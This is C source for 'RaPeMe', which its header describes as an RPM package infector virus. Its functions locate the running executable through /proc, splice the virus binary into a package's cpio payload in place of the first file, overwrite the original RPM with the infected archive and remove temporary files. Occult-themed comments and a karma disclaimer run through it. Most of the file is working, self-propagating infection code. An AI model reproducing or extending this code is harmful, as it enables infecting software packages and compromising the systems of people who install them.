/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : intestinal.cancer@hotmail.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include "infect.h"
#include "hunt.h"

/*=====
	make an infected cpio arch:
	the first file is the virus replacing the orig first file
	and the rest is untouched
=====*/
FILE *prepare_virus_cpio(FILE *cpio,char *cpio_first_file_name,int cpio_first_file_name_len,
			unsigned long cpio_first_file_size)
{
	FILE *me,*my_tmp;
	pid_t my_pid;	
	char my_tmp_name[128],my_name[128],my_proc_name[128],ily[128];
	unsigned long my_size,tampax,cpio_size;
	int i,k;		

	/* get your pid and read your executable name from /proc/PID */
	my_pid = getpid();

	strncpy(my_proc_name,PROC_DIR_TAG,sizeof(PROC_DIR_TAG));
	sprintf(ily,"%d",my_pid);
	strncat(my_proc_name,ily,sizeof(ily));
	strncat(my_proc_name,PROC_CMD_TAG,sizeof(PROC_CMD_TAG));

	/* first use my_tmp for proc file */
	my_tmp = fopen(my_proc_name,"r");
	if(!my_tmp) {
		perror("fopen");
		exit(1);
	}

	/* get virus name*/
	fgets(my_tmp_name,sizeof(my_tmp_name),my_tmp);	
	if(my_tmp_name[0] == '.')
		for(i = 0,k = 2;i < sizeof(my_tmp_name);i++,k++)
			my_name[i] = my_tmp_name[k];			

	else strncpy(my_name,my_tmp_name,sizeof(my_tmp_name));

	fclose(my_tmp);

	/* open the virus itself and get its size */ 
	me = fopen(my_name,"r");
	if(!me) {
		perror("fopen");
		exit(1);
	}
	
	fseek(me,0,SEEK_END);
	my_size = ftell(me);
	rewind(me);

	/* now use my_tmp for the infected cpio tmp file */ 
	my_tmp = fopen(LAST_TMP,"w");
	if(!my_tmp) {
		perror("fopen");
		exit(1);
	}

	fprintf(my_tmp,"%s",CPIO_VIRUS_HEADER_1);

	/* calculate how many zeros to write in the cpio header 
		before writing virus size : infos in the cpio header
		are zero padded on the left */		  
	if(my_size > 0xfff)
		fprintf(my_tmp,"%s","0000");
	if(my_size > 0xffff)
		fprintf(my_tmp,"%s","000");
	if(my_size > 0xfffff)
		fprintf(my_tmp,"%s","00");

	/* write virus size */
	fprintf(my_tmp,"%x",my_size);
	fprintf(my_tmp,"%s",CPIO_VIRUS_HEADER_2);
	
	/* write first file name len and fill with zeros */
	fprintf(my_tmp,"%x",cpio_first_file_name_len);

	if(cpio_first_file_name_len > 0xf)
		fprintf(my_tmp,"%s","00000000");
	if(cpio_first_file_name_len <= 0xf)
		fprintf(my_tmp,"%s","000000000");

	/* write first file name*/
	fprintf(my_tmp,"%s",cpio_first_file_name);
	
	/* fill with zero : very important for the archive integrity */
	for(i = 0;i < DAMN_IT;i++)
		putc(0x0,my_tmp);

	/* write the virus */
	while(my_size-- != 0)
		putc(getc(me),my_tmp); 

	fclose(me);

	fseek(cpio,0,SEEK_END);
	cpio_size = ftell(cpio);

	/* get the rest of the original cpio archive 
           and put it into the infected one */ 
	fseek(cpio,cpio_first_file_size + CPIO_HEADER_SIZE + cpio_first_file_name_len +2,SEEK_SET);
	fflush(my_tmp);
	tampax = ftell(cpio);

	while(cpio_size-- != tampax) 
		putc(getc(cpio),my_tmp);

	/* all done */

	fclose(my_tmp);
	fclose(cpio);

	system(GZIP_ARCHIVE);

	my_tmp = fopen(LAST_TMP_GZ,"r");
	if(!my_tmp) {
		perror("fopen");
		exit(1);
	}

	return my_tmp;	
	
}

/* ==========
	Pure is we begin.
	Pure is we come in.
	Let magick come 'round,from under the ground
	To form with my sound and then to be bound.
	Let all hatred CEASE and let there be PEACE.
	PLEASE let all hatred CEASE. 
	PLEASE let there be PEACE. 
	These words that I say with magick AWAY.
	This spell that I send is now at an end. 
 	Let the magick I've laid
	Go forth and not fade.
========== */

void magick_ritual(FILE *rpm,FILE *arch,char *r_name,unsigned long rpm_offset)
{
	FILE *wicca;			/* follow the cult */
	FILE *rpm_n;
	char tmp_path[128],buf[5],eris[FILENAME_MAX];
	unsigned long arch_size,rpm_size;

	srand((unsigned int) time(NULL));

	/*generate a random number and use it as the file name
		for the orig rpm back up */		
	strncpy(tmp_path,TMP_DIR_TAG,sizeof(TMP_DIR_TAG));
	sprintf(buf,"%d",rand() % 10000);
	strncat(tmp_path,buf,sizeof(buf));
	strncat(tmp_path,".rpm",4);

	wicca = fopen(tmp_path,"w");
	if(!wicca) {
		perror("fopen");
		exit(1);
	}
	
	rewind(rpm);
	
	/* back up the orig rpm */ 
	fseek(rpm,0,SEEK_END);
	rpm_size = ftell(rpm);
	fflush(rpm);	
	rewind(rpm);

	while(rpm_size-- != 0)
		putc(getc(rpm),wicca);

	fclose(wicca);

	rpm_n = fopen(tmp_path,"r");
	if(!rpm_n) {
		perror("fopen");
		exit(1);
	}

	wicca = fopen(r_name,"w");
	if(!wicca) {
		perror("fopen");
		exit(1);
	}

	/* copy the rpm header */ 
	while(rpm_offset-- != 0)
		putc(getc(rpm_n),wicca);

	fseek(arch,0,SEEK_END);
	arch_size = ftell(arch);
	fflush(wicca);
	fflush(arch);
	rewind(arch);

	while(arch_size-- != 0)
		putc(getc(arch),wicca);

	fclose(wicca);
	fclose(rpm_n);

	/* resign the infected rpm, 
	commented for black magic mistery reason
	strncpy(eris,RPM_RESIGN,sizeof(RPM_RESIGN));
	strcat(eris,r_name);
	strncat(eris,DEV_NULL_OUT,sizeof(DEV_NULL_OUT));
	
	system(eris);
	*/

	/* remove every unnecessary file */

	unlink(LAST_TMP_GZ);
	unlink(TMP_ARCHIVE_NAME);
	
}





